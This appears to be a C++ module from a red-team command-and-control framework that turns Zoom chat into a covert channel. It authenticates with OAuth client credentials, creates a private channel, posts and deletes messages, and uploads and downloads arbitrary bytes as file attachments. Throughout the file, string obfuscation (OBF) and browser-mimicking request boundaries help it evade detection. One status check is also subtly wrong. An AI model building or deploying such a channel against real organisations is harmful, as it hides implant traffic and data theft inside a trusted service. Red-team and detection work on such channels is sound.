#include "stdafx.h"
#include "ZoomApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include "Common/FSecure/Crypto/Base64.h"
#include <random>
#include <cctype>
#include <algorithm>
#include <chrono>
#include <format>
#include <ctime>
#include <sstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}

FSecure::Zoom::Zoom(std::string const& userAgent, std::string const& account_id, std::string const& client_id, std::string const& client_secret, std::string const& email, std::string const& vanity_domain, std::string const& channelName)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_clientId = client_id;
	this->m_clientSecret = client_secret;
	this->m_accountId = account_id;
	this->m_userAgent = userAgent;
	this->m_vanityDomain = vanity_domain;

	if (email.empty())
		this->m_email = OBF("no-one@testdevnullnodomain.com");
	else
		this->m_email = email;
	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });

	GetAccessToken();
	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::Zoom::GetAccessToken()
{
	std::string url = OBF("https://zoom.us/oauth/token");
	if (!this->m_vanityDomain.empty())
	{
		url = OBF("https://") + this->m_vanityDomain + OBF("/oauth/token");
	}
	HttpClient webClient(ToWideString(url), m_ProxyConfig);

	while (true) {
		HttpRequest request;
		request.m_Method = Method::POST;

		std::string toSend = OBF("account_id=") + this->m_accountId;
		toSend += OBF("&grant_type=account_credentials");
		std::vector<uint8_t> body = { toSend.begin(), toSend.end() };

		request.SetData(GetContentType(ContentType::ApplicationXWwwFormUrlencoded), body);
		request.SetHeader(Header::Host, OBF(L"zoom.us"));
		request.SetHeader(Header::UserAgent, ToWideString(this->m_userAgent));
		request.SetHeader(Header::Authorization, OBF(L"Basic ") + ToWideString(cppcodec::base64_rfc4648::encode<std::string>(this->m_clientId + ":" + this->m_clientSecret)));

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		{
			SetToken(json::parse(resp.GetData())[OBF("access_token")]);
			return;
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests || resp.GetStatusCode() == StatusCode::Conflict)
		{
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else
			throw std::exception(OBF("[x] Failed to retrieve access token.\n"));
	}
}

void FSecure::Zoom::SetChannel(std::string const& channelId)
{
	this->m_channelId = channelId;
}

void FSecure::Zoom::SetToken(std::string const& token)
{
	this->m_Token = token;
}

std::string FSecure::Zoom::WriteMessage(std::string const& text)
{
	json j;
	j[OBF("message")] = text;
	j[OBF("to_channel")] = this->m_channelId;
	std::string path = OBF("/v2/chat/users/me/messages");

	json output = SendJsonRequest(path, j, Method::POST);

	return output[OBF("id")].get<std::string>();
}

std::map<std::string, std::string> FSecure::Zoom::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	std::string path = OBF("/v2/chat/users/me/channels?page_size=1000");

	json response = GetJsonResponse(path);

	for (auto& channel : response[OBF("channels")])
	{
		std::string cName = channel[OBF("name")];
		std::string cId = channel[OBF("id")].get<std::string>();
		channelMap.insert({ cName, cId });
	}

	return channelMap;
}

std::string FSecure::Zoom::CreateChannel(std::string const& channelName)
{
	std::map<std::string, std::string> channels = this->ListChannels();

	if (channels.find(channelName) == channels.end())
	{
		std::string path = OBF("/v2/chat/users/me/channels");
		json member;
		member[OBF("email")] = this->m_email;

		json members = nlohmann::json::array();
		members.push_back(member);

		json j;
		j[OBF("name")] = channelName;
		j[OBF("type")] = 1;
		j[OBF("members")] = members;

		json response = SendJsonRequest(path, j, Method::POST);

		if (!response.contains(OBF("id")))
			throw std::runtime_error(OBF("Throwing exception: unable to create channel\n"));
		return response[OBF("id")];
	}

	return channels[channelName];
}

json FSecure::Zoom::GetAllMessages()
{
	std::string yesterday = FSecure::Zoom::Yesterday();
	std::string path = OBF("/v2/chat/users/me/messages?to_channel=") + this->m_channelId + OBF("&page_size=50&from=") + yesterday;
	std::string nextPageToken;
	json all_messages;

	do {
		json response = GetJsonResponse(path);

		for (auto& m : response[OBF("messages")])
		{
			all_messages.emplace_back(m);
		}

		nextPageToken = response[OBF("next_page_token")];
		path = OBF("/v2/chat/users/me/messages?to_channel=") + this->m_channelId + OBF("&page_size=50&next_page_token=") + nextPageToken + OBF("&from=") + yesterday;
	} while (!nextPageToken.empty()); 
	return all_messages;
}

void FSecure::Zoom::UpdateMessage(std::string const& message, std::string const& messageId)
{
	std::string path = OBF("/v2/chat/users/me/messages/") + messageId;
	json j;
	j[OBF("message")] = message;
	j[OBF("to_channel")] = this->m_channelId;

	std::string jsonString = j.dump();
	SendHttpRequest(path, ContentType::ApplicationJson, { std::make_move_iterator(jsonString.begin()), std::make_move_iterator(jsonString.end()) }, Method::PUT);
}

// Unusued 
void FSecure::Zoom::WriteReply(std::string const& text, std::string const& messageId)
{
	assert(text.size() <= 1024);
	std::string path = OBF("/v2/chat/users/me/messages");

	json j;
	j[OBF("message")] = text;
	j[OBF("to_channel")] = this->m_channelId;
	j[OBF("reply_main_message_id")] = messageId;

	SendJsonRequest(path, j, Method::POST);
}

void FSecure::Zoom::DeleteMessage(std::string const& messageId)
{
	std::string path = OBF("/v2/chat/users/me/messages/") + messageId + "?to_channel=" + this->m_channelId;
	SendHttpRequest(path, ContentType::ApplicationJson, {}, Method::DEL);
}

void FSecure::Zoom::DeleteChannel()
{
	std::string url = OBF("/v2/chat/channels/") + this->m_channelId;
	SendHttpRequest(url, ContentType::ApplicationJson, {}, Method::DEL);
}

void FSecure::Zoom::DeleteMessages(std::vector<std::string> const& replyIds)
{
	for (auto& id : replyIds)
	{
		DeleteMessage(id);
	}
}

void FSecure::Zoom::DeleteAllMessages()
{
	json all_messages = FSecure::Zoom::GetAllMessages();
	for (auto& message : all_messages)
	{
		DeleteMessage(message[OBF("id")]);
	}
}


FSecure::ByteVector FSecure::Zoom::SendHttpRequest(std::string const& path, ContentType contentType, std::vector<uint8_t> const& data, Method method) {
	return SendHttpRequest(path, GetContentType(contentType), data, method);
}

FSecure::ByteVector FSecure::Zoom::SendHttpRequest(std::string const& path, std::wstring const& contentType, std::vector<uint8_t> const& data, Method method) {
	std::string url = OBF("https://api.zoom.us") + path;
	if (!this->m_vanityDomain.empty())
	{
		url = OBF("https://") + this->m_vanityDomain + path;
	}

	HttpClient webClient(ToWideString(url), m_ProxyConfig);

	while (true) {
		HttpRequest request;
		request.m_Method = method;

		if (!data.empty()) {
			request.SetData(contentType, data);
		}

		request.SetHeader(Header::Host, ToWideString(OBF("api.zoom.us")));
		request.SetHeader(Header::UserAgent, ToWideString(this->m_userAgent));
		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
			return resp.GetData();
		else if (resp.GetStatusCode() == StatusCode::Forbidden || resp.GetStatusCode() == StatusCode::Unauthorized)
			GetAccessToken(); // Refresh access token (1 hour lifetime)
		else if (resp.GetStatusCode() == StatusCode::NoContent)
			return {};
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests || resp.GetStatusCode() == StatusCode::Conflict)
		{	
			std::wstring retry = resp.GetHeader(ToWideString(OBF("Retry-After")));
			if (!retry.empty())
			{
				std::this_thread::sleep_for(std::chrono::seconds(std::stoi(retry)+1));
			}
			else
				std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
	}
}

json FSecure::Zoom::SendJsonRequest(std::string const& path, json const& data, Method method) {

	if (data == NULL) {
		auto resp = json::parse(SendHttpRequest(path, ContentType::MultipartFormData, {}, method));
		return resp;
	}
	else {
		std::string j = data.dump();
		auto resp = json::parse(SendHttpRequest(path, ContentType::ApplicationJson, { std::make_move_iterator(j.begin()), std::make_move_iterator(j.end()) }, method));
		return resp;
	}
}

json FSecure::Zoom::GetJsonResponse(std::string const& url)
{
	auto resp = json::parse(SendHttpRequest(url, ContentType::ApplicationJson, {}, Method::GET));
	return resp;
}

std::string FSecure::Zoom::UploadFile(ByteView data, std::string const& messageId)
{
	// Should get a 307 redirect from file.zoom.us to us04file.zoom.usendpoint which will automatically be followed
	// Hardcode it here to improve speed
	std::string url = OBF("https://us04file.zoom.us/v2/chat/users/me/messages/files");

	// Generating body
	std::string boundary = OBF("------WebKitFormBoundary") + Utils::GenerateRandomString(16); // Mimicking WebKit, generate random boundary string

	// Building the multipart body (prefix + attachment + suffix)
	std::vector<uint8_t> body;
	std::string bodyPrefix = OBF("\r\n");
	bodyPrefix += OBF("--") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Disposition: form-data; name=\"to_channel\"\r\n\r\n");
	bodyPrefix += this->m_channelId;
	bodyPrefix += OBF("\r\n");
	bodyPrefix += OBF("--") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Disposition: form-data; name=\"reply_main_message_id\"\r\n\r\n");
	bodyPrefix += messageId;
	bodyPrefix += OBF("\r\n");
	bodyPrefix += OBF("--") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Disposition: form-data; name=\"file\"; filename=\"file.txt\"\r\n");
	bodyPrefix += OBF("Content-Type: application/octet-stream\r\n\r\n");

	body.insert(body.begin(), bodyPrefix.begin(), bodyPrefix.end()); // Insert the prefix
	body.insert(body.end(), data.begin(), data.end()); // Insert the attachment content
	std::string bodySuffix = OBF("\r\n");
	bodySuffix += OBF("--") + boundary + OBF("--") + OBF("\r\n");
	body.insert(body.end(), bodySuffix.begin(), bodySuffix.end()); // Insert the suffix

	std::string contentType = OBF("multipart/form-data; boundary=") + boundary;

	HttpClient webClient(ToWideString(url), m_ProxyConfig);

	while (true)
	{
		HttpRequest request;
		request.m_Method = Method::POST;
		request.SetData(ToWideString(contentType), body);

		request.SetHeader(Header::UserAgent, ToWideString(this->m_userAgent));
		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::Created)
		{
			auto respJson = json::parse(resp.GetData());
			return respJson[OBF("id")].get<std::string>();
		}
		else if (resp.GetStatusCode() == StatusCode::Forbidden || resp.GetStatusCode() == StatusCode::Unauthorized)
			GetAccessToken(); // Refresh access token (1 hour lifetime)
		else
			throw std::exception(OBF("[x] Non 201 HTTP Response\n"));
	}
}

std::string FSecure::Zoom::GetFile(std::string const& url)
{
	HttpClient webClient(ToWideString(url), m_ProxyConfig);
	HttpRequest request;
	request.m_Method = Method::GET;

	request.SetHeader(Header::UserAgent, ToWideString(this->m_userAgent));

	auto resp = webClient.Request(request);

	if (!resp.GetStatusCode() == StatusCode::OK)
		throw std::exception(OBF("[x] Non 200 HTTP Response\n"));
	else
		return { resp.GetData().begin(), resp.GetData().end() };
}


std::string FSecure::Zoom::Yesterday() {
	using namespace std::chrono;

	auto now = system_clock::now();
	auto yesterday = now - hours(24);

	std::time_t tt = system_clock::to_time_t(yesterday);

	std::tm utc_tm;
	gmtime_s(&utc_tm, &tt);

	std::ostringstream oss;
	oss << std::put_time(&utc_tm, OBF("%Y-%m-%dT%H:%M:%SZ"));

	return oss.str();
}


